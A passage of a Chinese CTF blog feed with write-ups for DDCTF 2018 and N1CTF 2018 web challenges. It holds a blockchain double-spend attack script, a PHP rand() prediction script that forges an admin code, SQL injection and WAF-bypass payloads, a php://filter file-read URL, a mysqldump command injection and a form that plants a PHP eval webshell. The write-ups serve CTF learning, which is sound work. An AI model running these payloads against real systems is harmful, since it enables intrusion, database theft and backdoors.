class="comment"># append_block(fake_third_block)</span></div><div class="line">        <span class="comment"># fake_fourth_block = create_block(fake_third_block['hash'], "aaaa", [])</span></div><div class="line">        <span class="comment"># append_block(fake_fourth_block)</span></div><div class="line">		</div><div class="line">        <span class="comment"># try:</span></div><div class="line">			<span class="comment"># print "start attack!"</span></div><div class="line">			<span class="comment"># x = 0</span></div><div class="line">			<span class="comment"># while x &lt;0xfffffff:</span></div><div class="line">				<span class="comment"># fouth_block =  create_block(third_block['hash'], str(x), [transferred])</span></div><div class="line">				</div><div class="line">				<span class="comment"># if  int(fouth_block["hash"],16)&lt;= DIFFICULTY:</span></div><div class="line">					<span class="comment"># print fouth_block</span></div><div class="line">					<span class="comment"># break</span></div><div class="line">				<span class="comment"># x+=1</span></div><div class="line">			</div><div class="line">        <span class="comment"># except:</span></div><div class="line">			<span class="comment"># print "end at ",hex(x)</span></div><div class="line">		<span class="comment"># print "end!"</span></div><div class="line">		</div><div class="line">		<span class="comment"># append_block(fouth_block)</span></div><div class="line">		</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_balance_of_all</span><span class="params">()</span>:</span></div><div class="line">    init()</div><div class="line">    tail = find_blockchain_tail()</div><div class="line">    utxos = calculate_utxo(tail)</div><div class="line">    <span class="keyword">return</span> calculate_balance(utxos), utxos, tail</div><div class="line">    </div><div class="line"><span class="meta">@app.route(url_prefix+'/')</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">homepage</span><span class="params">()</span>:</span></div><div class="line">    balance, utxos, _ = get_balance_of_all()</div><div class="line">    genesis_block_info = <span class="string">'hash of genesis block: '</span> + session[<span class="string">'genesis_block_hash'</span>]</div><div class="line">    addr_info = <span class="string">'the bank\'s addr: '</span> + bank_address + <span class="string">', the hacker\'s addr: '</span> + hacker_address + <span class="string">', the shop\'s addr: '</span> + shop_address</div><div class="line">    balance_info = <span class="string">'Balance of all addresses: '</span> + json.dumps(balance)</div><div class="line">    utxo_info = <span class="string">'All utxos: '</span> + json.dumps(utxos)</div><div class="line">    blockchain_info = <span class="string">'Blockchain Explorer: '</span> + json.dumps(session[<span class="string">'blocks'</span>])</div><div class="line">    view_source_code_link = <span class="string">"&lt;a href='source_code'&gt;View source code&lt;/a&gt;"</span></div><div class="line">    <span class="keyword">return</span> <span class="string">'&lt;br /&gt;&lt;br /&gt;\r\n\r\n'</span>.join([view_source_code_link, genesis_block_info, addr_info, balance_info, utxo_info, blockchain_info])</div><div class="line">    </div><div class="line">    </div><div class="line"><span class="meta">@app.route(url_prefix+'/flag')</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">getFlag</span><span class="params">()</span>:</span></div><div class="line">    init()</div><div class="line">    <span class="keyword">if</span> session[<span class="string">'your_diamonds'</span>] &gt;= <span class="number">2</span>: <span class="keyword">return</span> FLAG()</div><div class="line">    <span class="keyword">return</span> <span class="string">'To get the flag, you should buy 2 diamonds from the shop. You have &#123;&#125; diamonds now. To buy a diamond, transfer 1000000 DDCoins to '</span>.format(session[<span class="string">'your_diamonds'</span>]) + shop_address</div><div class="line">    </div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_enough_utxos</span><span class="params">(utxos, addr_from, amount)</span>:</span></div><div class="line">    collected = []</div><div class="line">    <span class="keyword">for</span> utxo <span class="keyword">in</span> utxos.values():</div><div class="line">        <span class="keyword">if</span> utxo[<span class="string">'addr'</span>] == addr_from:</div><div class="line">            amount -= utxo[<span class="string">'amount'</span>]</div><div class="line">            collected.append(utxo[<span class="string">'id'</span>])</div><div class="line">        <span class="keyword">if</span> amount &lt;= <span class="number">0</span>: <span class="keyword">return</span> collected, -amount</div><div class="line">    <span class="keyword">raise</span> Exception(<span class="string">'no enough DDCoins in '</span> + addr_from)</div><div class="line">    </div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">transfer</span><span class="params">(utxos, addr_from, addr_to, amount, privkey)</span>:</span></div><div class="line">    input_utxo_ids, the_change = find_enough_utxos(utxos, addr_from, amount)</div><div class="line">    outputs = [create_output_utxo(addr_to, amount)]</div><div class="line">    <span class="keyword">if</span> the_change != <span class="number">0</span>:</div><div class="line">        outputs.append(create_output_utxo(addr_from, the_change))</div><div class="line">    <span class="keyword">return</span> create_tx(input_utxo_ids, outputs, privkey)</div><div class="line">    </div><div class="line"><span class="meta">@app.route(url_prefix+'/5ecr3t_free_D1diCoin_b@ckD00r/&lt;string:address&gt;')</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">free_ddcoin</span><span class="params">(address)</span>:</span></div><div class="line">    balance, utxos, tail = get_balance_of_all()</div><div class="line">    <span class="keyword">if</span> balance[bank_address] == <span class="number">0</span>: <span class="keyword">return</span> <span class="string">'The bank has no money now.'</span></div><div class="line">    <span class="keyword">try</span>:</div><div class="line">        address = str(address)</div><div class="line">        addr_to_pubkey(address) <span class="comment"># to check if it is a valid address</span></div><div class="line">        transferred = transfer(utxos, bank_address, address, balance[bank_address], bank_privkey)</div><div class="line">        new_block = create_block(tail[<span class="string">'hash'</span>], <span class="string">'b@cKd00R tr1993ReD'</span>, [transferred])</div><div class="line">        append_block(new_block)</div><div class="line">        <span class="keyword">return</span> str(balance[bank_address]) + <span class="string">' DDCoins are successfully sent to '</span> + address</div><div class="line">    <span class="keyword">except</span> Exception, e:</div><div class="line">        <span class="keyword">return</span> <span class="string">'ERROR: '</span> + str(e)</div><div class="line"></div><div class="line">DIFFICULTY = int(<span class="string">'00000'</span> + <span class="string">'f'</span> * <span class="number">59</span>, <span class="number">16</span>)</div><div class="line"><span class="meta">@app.route(url_prefix+'/create_transaction', methods=['POST'])</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_tx_and_check_shop_balance</span><span class="params">()</span>:</span></div><div class="line">    init()</div><div class="line">    <span class="keyword">try</span>:</div><div class="line">        <span class="comment"># print request.data</span></div><div class="line">        block = json.loads(request.data)</div><div class="line">        append_block(block, DIFFICULTY)</div><div class="line">        msg = <span class="string">'transaction finished.'</span></div><div class="line">    <span class="keyword">except</span> Exception, e:</div><div class="line">        <span class="keyword">return</span> str(e)</div><div class="line">        </div><div class="line">    balance, utxos, tail = get_balance_of_all()</div><div class="line">    <span class="keyword">if</span> balance[shop_address] == <span class="number">1000000</span>:</div><div class="line">        <span class="comment"># when 1000000 DDCoins are received, the shop will give you a diamond</span></div><div class="line">        session[<span class="string">'your_diamonds'</span>] += <span class="number">1</span></div><div class="line">        <span class="comment"># and immediately the shop will store the money somewhere safe.</span></div><div class="line">        transferred = transfer(utxos, shop_address, shop_wallet_address, balance[shop_address], shop_privkey)</div><div class="line">        new_block = create_block(tail[<span class="string">'hash'</span>], <span class="string">'save the DDCoins in a cold wallet'</span>, [transferred])</div><div class="line">        append_block(new_block)</div><div class="line">        msg += <span class="string">' You receive a diamond.'</span></div><div class="line">    <span class="keyword">return</span> msg</div><div class="line">    </div><div class="line">        </div><div class="line"><span class="comment"># if you mess up the blockchain, use this to reset the blockchain.</span></div><div class="line"><span class="meta">@app.route(url_prefix+'/reset')</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">reset_blockchain</span><span class="params">()</span>:</span></div><div class="line">    <span class="keyword">if</span> <span class="string">'blocks'</span> <span class="keyword">in</span> session: <span class="keyword">del</span> session[<span class="string">'blocks'</span>]</div><div class="line">    <span class="keyword">if</span> <span class="string">'genesis_block_hash'</span> <span class="keyword">in</span> session: <span class="keyword">del</span> session[<span class="string">'genesis_block_hash'</span>]</div><div class="line">    <span class="keyword">return</span> <span class="string">'reset.'</span></div><div class="line">    </div><div class="line"><span class="meta">@app.route(url_prefix+'/source_code')</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_source_code</span><span class="params">()</span>:</span></div><div class="line">    source = open(<span class="string">'serve.py'</span>, <span class="string">'r'</span>)</div><div class="line">    html = <span class="string">''</span></div><div class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> source:</div><div class="line">        html += line.replace(<span class="string">'&amp;'</span>,<span class="string">'&amp;amp;'</span>).replace(<span class="string">'\t'</span>, <span class="string">'&amp;nbsp;'</span>*<span class="number">4</span>).replace(<span class="string">' '</span>,<span class="string">'&amp;nbsp;'</span>).replace(<span class="string">'&lt;'</span>, <span class="string">'&amp;lt;'</span>).replace(<span class="string">'&gt;'</span>,<span class="string">'&amp;gt;'</span>).replace(<span class="string">'\n'</span>, <span class="string">'&lt;br /&gt;'</span>)</div><div class="line">    source.close()</div><div class="line">    <span class="keyword">return</span> html</div><div class="line">    </div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    app.run(debug=<span class="keyword">False</span>, host=<span class="string">'0.0.0.0'</span>)</div></pre></td></tr></table></figure>
<p>payload代码如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span>  server <span class="keyword">import</span> *</div><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">import</span> re</div><div class="line">x = <span class="number">0</span></div><div class="line"></div><div class="line">ip = <span class="string">"116.85.48.107"</span></div><div class="line">port = <span class="string">"5000"</span></div><div class="line"></div><div class="line"></div><div class="line">r = requests.get(<span class="string">"http://"</span>+ip+<span class="string">":"</span>+port+<span class="string">"/b9744af30897e/"</span>)</div><div class="line"></div><div class="line"></div><div class="line">genesis_block = re.findall(<span class="string">r'genesis block: (.*)&lt;br /&gt;&lt;br /&gt;'</span>,r.content)[<span class="number">0</span>]</div><div class="line">shop_addr = re.findall(<span class="string">r"the shop's addr: (.*)&lt;br /&gt;&lt;br /&gt;"</span>,r.content)[<span class="number">0</span>]</div><div class="line">cookie = r.headers[<span class="string">"Set-Cookie"</span>]</div><div class="line"></div><div class="line"><span class="comment"># print shop_addr</span></div><div class="line"></div><div class="line"><span class="comment"># print genesis_block</span></div><div class="line">block_hash = genesis_block</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">try</span>:</div><div class="line">	<span class="keyword">print</span> <span class="string">"start attack!"</span></div><div class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">3</span>):</div><div class="line">		<span class="keyword">while</span> x &lt;<span class="number">0xfffffff</span>:</div><div class="line">			new_block =  create_block(block_hash, str(x), [])</div><div class="line">			x+=<span class="number">1</span></div><div class="line">			<span class="keyword">if</span>  int(new_block[<span class="string">"hash"</span>],<span class="number">16</span>) &lt;= DIFFICULTY:</div><div class="line">				r = requests.post(url=<span class="string">"http://"</span>+ip+<span class="string">":"</span>+port+<span class="string">"/b9744af30897e/create_transaction"</span>,data=json.dumps(new_block),proxies = &#123;<span class="string">"http"</span>:<span class="string">"http://127.0.0.1:8080"</span>&#125;,headers=&#123;<span class="string">"Cookie"</span>:cookie,<span class="string">"Content-Type"</span>:<span class="string">"application/json"</span>&#125;)</div><div class="line">				</div><div class="line">				cookie = r.headers[<span class="string">"Set-Cookie"</span>]</div><div class="line">				block_hash = new_block[<span class="string">'hash'</span>]</div><div class="line">				</div><div class="line">				<span class="keyword">break</span></div><div class="line">			</div><div class="line">		</div><div class="line">	r = requests.get(url=<span class="string">"http://"</span>+ip+<span class="string">":"</span>+port+<span class="string">"/b9744af30897e/5ecr3t_free_D1diCoin_b@ckD00r/"</span>+shop_addr,proxies = &#123;<span class="string">"http"</span>:<span class="string">"http://127.0.0.1:8080"</span>&#125;,headers=&#123;<span class="string">"Cookie"</span>:cookie&#125;)</div><div class="line">	</div><div class="line">	cookie = r.headers[<span class="string">"Set-Cookie"</span>]</div><div class="line">	block_hash = genesis_block</div><div class="line"></div><div class="line"><span class="keyword">except</span> Exception,e:</div><div class="line">	<span class="keyword">print</span> <span class="string">"end at "</span>,hex(x)</div><div class="line">	<span class="keyword">print</span> e</div><div class="line"><span class="keyword">print</span> <span class="string">"end!"</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">try</span>:</div><div class="line">	<span class="keyword">print</span> <span class="string">"start attack!"</span></div><div class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">5</span>):</div><div class="line">		<span class="keyword">while</span> x &lt;<span class="number">0xfffffff</span>:</div><div class="line">			new_block =  create_block(block_hash, str(x), [])</div><div class="line">			x+=<span class="number">1</span></div><div class="line">			<span class="keyword">if</span>  int(new_block[<span class="string">"hash"</span>],<span class="number">16</span>) &lt;= DIFFICULTY:</div><div class="line">				r = requests.post(url=<span class="string">"http://"</span>+ip+<span class="string">":"</span>+port+<span class="string">"/b9744af30897e/create_transaction"</span>,data=json.dumps(new_block),proxies = &#123;<span class="string">"http"</span>:<span class="string">"http://127.0.0.1:8080"</span>&#125;,headers=&#123;<span class="string">"Cookie"</span>:cookie,<span class="string">"Content-Type"</span>:<span class="string">"application/json"</span>&#125;)</div><div class="line">				</div><div class="line">				cookie = r.headers[<span class="string">"Set-Cookie"</span>]</div><div class="line">				block_hash = new_block[<span class="string">'hash'</span>]</div><div class="line">				</div><div class="line">				<span class="keyword">break</span></div><div class="line">			</div><div class="line">		</div><div class="line">	r = requests.get(url=<span class="string">"http://"</span>+ip+<span class="string">":"</span>+port+<span class="string">"/b9744af30897e/5ecr3t_free_D1diCoin_b@ckD00r/"</span>+shop_addr,proxies = &#123;<span class="string">"http"</span>:<span class="string">"http://127.0.0.1:8080"</span>&#125;,headers=&#123;<span class="string">"Cookie"</span>:cookie&#125;)</div><div class="line">	</div><div class="line">	cookie = r.headers[<span class="string">"Set-Cookie"</span>]</div><div class="line">	block_hash = genesis_block</div><div class="line"></div><div class="line"><span class="keyword">except</span> Exception,e:</div><div class="line">	<span class="keyword">print</span> <span class="string">"end at "</span>,hex(x)</div><div class="line">	<span class="keyword">print</span> e</div><div class="line"><span class="keyword">print</span> <span class="string">"end!"</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">while</span> x &lt;<span class="number">0xfffffff</span>:</div><div class="line">	new_block =  create_block(block_hash, str(x), [])</div><div class="line">	x+=<span class="number">1</span></div><div class="line">	<span class="keyword">if</span>  int(new_block[<span class="string">"hash"</span>],<span class="number">16</span>) &lt;= DIFFICULTY:</div><div class="line">		r = requests.post(url=<span class="string">"http://"</span>+ip+<span class="string">":"</span>+port+<span class="string">"/b9744af30897e/create_transaction"</span>,data=json.dumps(new_block),proxies = &#123;<span class="string">"http"</span>:<span class="string">"http://127.0.0.1:8080"</span>&#125;,headers=&#123;<span class="string">"Cookie"</span>:cookie,<span class="string">"Content-Type"</span>:<span class="string">"application/json"</span>&#125;)</div><div class="line">		</div><div class="line">		cookie = r.headers[<span class="string">"Set-Cookie"</span>]</div><div class="line">		block_hash = new_block[<span class="string">'hash'</span>]</div><div class="line">		</div><div class="line">		<span class="keyword">break</span></div><div class="line">		</div><div class="line"><span class="keyword">print</span> requests.get(url=<span class="string">"http://"</span>+ip+<span class="string">":"</span>+port+<span class="string">"/b9744af30897e/flag"</span>,proxies = &#123;<span class="string">"http"</span>:<span class="string">"http://127.0.0.1:8080"</span>&#125;,headers=&#123;<span class="string">"Cookie"</span>:cookie&#125;).content</div></pre></td></tr></table></figure>
<h2 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h2><p>看到提示，直接下载源码，代码审计ing  </p>
<p>发现首页存在sql注入，但是需要admin的权限才能进行注入，而注册成为admin则需要一个code，则个code由<code>str_shuffle</code>这个关键函数函数生成。</p>
<img src="/2018/04/19/ddctf-2018/12.png" alt="12.png" title="">
<p>通过谷歌搜索这个函数的相关缺陷，发现这个函数内部是由rand()函数来决定随机性的，那么接下来就好办了。</p>
<img src="/2018/04/19/ddctf-2018/13.png" alt="13.png" title="">
<p>rand()函数是一个可预测的伪随机函数，具体可以参考  <a href="http://www.yqxiaojunjie.com/index.php/archives/275/" target="_blank" rel="external">http://www.yqxiaojunjie.com/index.php/archives/275/</a></p>
<p>再分析下 <code>RAND_RANGE</code> 的构成</p>
<img src="/2018/04/19/ddctf-2018/14.png" alt="14.png" title="">
<p>于是根据str_shuffle的源码，来实现python版本的<code>str_shuffle</code>，写出对应的预测算法。python脚本如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">import</span> re</div><div class="line"></div><div class="line">s = requests.Session()</div><div class="line"></div><div class="line">l  = [<span class="number">0</span>]*<span class="number">200</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">50</span>):</div><div class="line">	l[i] = re.findall(<span class="string">r'csrf" value="(.*)"'</span>,s.get(<span class="string">"http://116.85.39.110:5032/2096b322e99ffc1a59891b972c0fa612/login.php"</span>).content)[<span class="number">0</span>]</div><div class="line">	<span class="comment"># l[i] = s.get("http://192.168.148.137/rand.php").content</span></div><div class="line">	<span class="keyword">print</span> i,l[i]</div><div class="line"></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">112</span>):</div><div class="line">	m  = (int(l[i<span class="number">-3</span>])+int(l[i<span class="number">-31</span>])) % <span class="number">2147483647</span></div><div class="line">	<span class="keyword">if</span> i &gt;=<span class="number">50</span>:</div><div class="line">		<span class="keyword">print</span> <span class="string">"*"</span>,i,m,l[i<span class="number">-3</span>],l[i<span class="number">-31</span>],m,float(m) * (<span class="number">62</span>-(i<span class="number">-49</span>)) / <span class="number">2147483647</span> </div><div class="line">		l[i] = m</div><div class="line">		<span class="keyword">continue</span></div><div class="line">	<span class="keyword">print</span> i,l[i],l[i<span class="number">-3</span>],l[i<span class="number">-31</span>],m</div><div class="line"></div><div class="line">	</div><div class="line"></div><div class="line"></div><div class="line">i = <span class="number">50</span>	</div><div class="line">org_str  = list(<span class="string">'0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'</span>)</div><div class="line"></div><div class="line">str_len = len(org_str) - <span class="number">1</span></div><div class="line"></div><div class="line"><span class="keyword">while</span>(str_len):</div><div class="line">	<span class="comment"># rnd_index = int(round(float(l[i]) * (str_len+0) / 2147483647))</span></div><div class="line">	 <span class="comment"># (__n) = (__min) + (long) ((double) ( (double) (__max) - (__min) + 1.0) * ((__n) / ((__tmax) + 1.0)))</span></div><div class="line">	min = <span class="number">0</span></div><div class="line">	rnd_index = l[i]</div><div class="line">	rnd_index = min +int( (float(str_len) - min +<span class="number">1.0</span>) * (rnd_index / (<span class="number">2147483647</span>+<span class="number">1.0</span>)) )</div><div class="line">	<span class="keyword">if</span> rnd_index != str_len:</div><div class="line">		temp = org_str[str_len]</div><div class="line">		org_str[str_len] = org_str[rnd_index]</div><div class="line">		org_str[rnd_index] = temp</div><div class="line">	</div><div class="line">	<span class="keyword">print</span> <span class="string">''</span>.join(org_str)</div><div class="line">	str_len -=<span class="number">1</span></div><div class="line">	i+=<span class="number">1</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="comment"># a =  org_str[:32]</span></div><div class="line"></div><div class="line">data = &#123;<span class="string">"csrf"</span>: l[<span class="number">49</span>],</div><div class="line"><span class="string">"username"</span>: <span class="string">"winter3un2"</span>,</div><div class="line"><span class="string">"password"</span>: <span class="string">"123456"</span>,</div><div class="line"><span class="string">"code"</span>: <span class="string">"admin###"</span>+<span class="string">""</span>.join(org_str)[:<span class="number">32</span>]</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">print</span> s.post(<span class="string">"http://116.85.39.110:5032/2096b322e99ffc1a59891b972c0fa612/register.php"</span>,data=data).content</div></pre></td></tr></table></figure>
<p>注册登陆后，利用sprinf函数中<code>%</code>会吞掉下一个字符的特性，具体参考 <a href="https://www.cnblogs.com/test404/p/7821884.html" target="_blank" rel="external">https://www.cnblogs.com/test404/p/7821884.html</a>  构造注入payload</p>
<p><code>http://116.85.39.110:5032/2096b322e99ffc1a59891b972c0fa612/?id=%20union%20select%201,2,f14g%20%20from%20key%20%23&amp;title=%1$%27%1$s</code></p>
<h2 id="web6"><a href="#web6" class="headerlink" title="web6"></a>web6</h2><p>首页源码中有用户名密码，登陆后发现一个存在任意文件下载漏洞的api，利用这个api下载源码分析。。。。</p>
<p>没分析出来啊！  虽然知道是ssrf ，super admin 的用户名也拿到了，但是登陆不了啊，接下去怎么玩啊，求指点！</p>
]]></content>
      
        
        <tags>
            
            <tag> web </tag>
            
            <tag> writeup </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[n1ctf 2018 web writeup]]></title>
      <url>/2018/03/19/2018-n1ctf/</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>因为工作上涉及到web知识的比较多，所以作为pwn选手，这次并没有关注pwn的任何一题题目。。反倒是把web题做了个一遍ORZ</p>
<a id="more"></a>
<h2 id="77777"><a href="#77777" class="headerlink" title="77777"></a>77777</h2><p>PS：<strong>这个系列题真虐狗</strong></p>
<p>题目的关键代码如下所示，接收用户发送过来的 flag 和hi 参数，并通过waf和sprintf格式化生成sql语句，关键点在于如何绕过waf函数（我这边写的waf函数和出题人写的是不一样，只是用于本地测试。）</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">  <span class="function"><span class="keyword">function</span> <span class="title">waf</span><span class="params">($points)</span></span></div><div class="line">  &#123;</div><div class="line">	  <span class="keyword">return</span> $points;</div><div class="line">  &#125;</div><div class="line">   </div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">update_point</span><span class="params">($p,$points)</span></span></div><div class="line">&#123;</div><div class="line">	$link=mysqli_connect(<span class="string">'127.0.0.1'</span>,<span class="string">'root'</span>,<span class="string">'root'</span>,<span class="string">'ctf_test'</span>);  </div><div class="line">	</div><div class="line">	$q = sprintf(<span class="string">"UPDATE user SET points =%d%s"</span>,$p,waf($points));</div><div class="line">	var_dump($q);</div><div class="line">	<span class="keyword">if</span>(!$query =mysqli_query($link,$q)) <span class="keyword">return</span> <span class="keyword">FALSE</span>;</div><div class="line">	<span class="keyword">return</span> <span class="keyword">TRUE</span>;</div><div class="line"></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">if</span>(!update_point($_REQUEST[<span class="string">'flag'</span>],$_REQUEST[<span class="string">'hi'</span>]))<span class="keyword">echo</span> <span class="string">'sorry'</span>;</div></pre></td></tr></table></figure>
<p>很明显，注入点在于points这个参数。</p>
<p><code>docker pull ubuntu:16.04</code>本地搭建好环境测试一波。</p>
<p>构建数据库语句<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">create database ctf_test；</div><div class="line">use ctf_test;</div><div class="line">create table user (id int,name text,points int);</div></pre></td></tr></table></figure></p>
<p>构造update查询的注入 payload 。</p>
<p>查询数据库当前用户信息，发送<code>flag=0&amp;hi=%2bconv(hex(substr(user(),1, 4)), 16, 10)</code>生成查询语句，<code>UPDATE user SET points = 0+conv(hex(substr(user(),1, 4)), 16, 10)</code>，发现竟然没有被waf挡住。。。</p>
<p>查询当前用户表中用户密码，发送<code>flag=0&amp;hi=%2bconv(hex(substr((select password),1, 4)), 16, 10)</code>，生成查询语语句 <code>UPDATE user SET points = 0+conv(hex(substr((select password),1, 4)), 16, 10)</code>，又过了waf。。。 ？（当时有点怀疑waf的真实性，不过后来测试admin、database都被waf挡住了，拿flag做题还是没问题的，但是万一flag不在当前用户的记录里呢，怎么做偏移？~</p>
<h2 id="77777-2"><a href="#77777-2" class="headerlink" title="77777-2"></a>77777-2</h2><p>emmmm关键的代码没有变，加强了waf，把password，pw，union等关键词挡住了，但是可以用如下的姿势绕过。</p>
<p><code>flag=0&amp;hi=%2bconv(hex(substr((select pw ),1, 4)), 16, 10)</code></p>
<p>没错。。pw左右各一个空格就绕过了，玄学。。</p>
<p>后台生成查询语句为<code>UPDATE user SET points = 0+conv(hex(substr((select pw ),1, 4)), 16, 10)</code> 应该是非预期，话说正解到底是啥？</p>
<h2 id="funning-eating-cms"><a href="#funning-eating-cms" class="headerlink" title="funning eating cms"></a>funning eating cms</h2><p>一个cms系统。。用了网上的模版。</p>
<p><code>index.php</code>页面的page参数存在文件包含漏洞，但是文件后缀名必须是php的才能包含，无法用来命令执行，只能看下源码，操作姿势<a href="http://47.52.152.93:20000/user.php?page=php://filter/read=convert.base64-encode/resource=config" target="_blank" rel="external">http://47.52.152.93:20000/user.php?page=php://filter/read=convert.base64-encode/resource=config</a></p>
<p>把看到的php文件都下载到本地，审计一波，发现<code>function.php</code>文件内<code>parse_url</code>函数存在绕过，当构造<code>////x.php?key=value</code>这种形式的uri的时候，parse_url函数将无法解析该uri。</p>
<p>之后在<a href="http://47.52.152.93:20000/templates/info.html" target="_blank" rel="external">http://47.52.152.93:20000/templates/info.html</a> 的源码里得知关键信息在<code>ffffllllaaaaggg.php</code>文件里面。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$keywords = [&quot;flag&quot;,&quot;manage&quot;,&quot;ffffllllaaaaggg&quot;];</div><div class="line">$uri = parse_url($_SERVER[&quot;REQUEST_URI&quot;]);</div><div class="line">parse_str($uri[&apos;query&apos;], $query);</div></pre></td></tr></table></figure>
<p>通过构造 <a href="http://47.52.152.93:20000////user.php?page=php://filter/read=convert.base64-encode/resource=ffffllllaaaaggg" target="_blank" rel="external">http://47.52.152.93:20000////user.php?page=php://filter/read=convert.base64-encode/resource=ffffllllaaaaggg</a>  即可获得下个提示信息（好像又是非预期。。。）之后在上传函数的流程中发现 上传文件名处存在命令注入，直接构造把数据库导出就可以获取flag。。</p>
<p><code>mysqldump -uroot -pNu1LCTF2018\!@#qwe --all-databases &gt; flagggggggg.png</code> (对不起，我就是这么暴力。。。</p>
<h2 id="easy-php"><a href="#easy-php" class="headerlink" title="easy php"></a>easy php</h2><p>两个非预期解法。</p>
<p>第一个是通过包含session文件，利用 <code>PHP_SESSION_UPLOAD_PROGRESS</code>控制session内容，成功达成命令执行。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&lt;form action=&quot;http://47.52.246.175:23333/&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;</div><div class="line"> &lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;&lt;?=`echo &apos;&lt;?php eval(\$_REQUEST[winter3un])?&gt;&apos;&gt;gg.php`?&gt;&quot; /&gt;</div><div class="line"> &lt;input type=&quot;file&quot; name=&quot;file1&quot; /&gt;</div><div class="line"> &lt;input type=&quot;submit&quot; /&gt;</div><div class="line">&lt;/form&gt;</div></pre></td></tr></table></figure>
<p>第二个是通过xdebug</p>
